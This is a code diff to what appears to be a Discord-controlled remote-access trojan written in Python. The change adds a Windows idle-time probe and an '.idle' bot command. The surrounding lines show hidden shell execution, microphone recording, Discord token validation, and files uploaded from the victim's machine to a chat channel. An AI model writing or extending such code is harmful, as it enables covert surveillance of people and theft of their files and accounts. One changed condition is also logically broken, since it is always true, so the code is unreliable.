@@ -139,6 +139,16 @@ def RecordMicro(duration=10, filePath=""):
         wf.setframerate(rate)
         wf.writeframes(b''.join(frames))
 
+class LASTINPUTINFO(ctypes.Structure):
+    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
+def GetIdleTime():
+    lii = LASTINPUTINFO()
+    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
+    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
+        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
+        return millis / 1000
+    return 0
+
 # ____________________________________________________________________________________________________________________________________________________ #
 # ========================================================== DISCORD FUNCS =========================================================================== #
 def ValidateToken(token: str) -> bool:
@@ -705,7 +715,7 @@ Internet Provider: {org}
                     finalCommand.extend(command[1:])
 
                     result = subprocess.run(finalCommand, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850")
-                    if result != "":
+                    if result != "" or result != " ":
                         embed = discord.Embed(description=f"Command executed successfully :\n```{result.stdout.strip()}```", color=discord.Color.purple())
                     else:
                         embed = discord.Embed(description=f"Command executed successfully", color=discord.Color.purple())
@@ -751,6 +761,14 @@ Internet Provider: {org}
                 filePath = command[1]
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - {os.path.basename(filePath)}")
                 await message.channel.send(file=fileEmbed)
+
+            # ____________________________________________________________________________________________________________________________________________ #
+            # =================================================================== .idle ================================================================== #
+            elif message.content == ".idle":
+                await message.delete()
+
+                embed = discord.Embed(description=f":stopwatch: Last input recorded `{GetIdleTime()}` seconds ago", color=discord.Color.green())
+                await message.channel.send(embed=embed)
 
             # _____________________________________________________________________________________________________________________________________________________ #
             # =================================================================== unkown command ================================================================== #
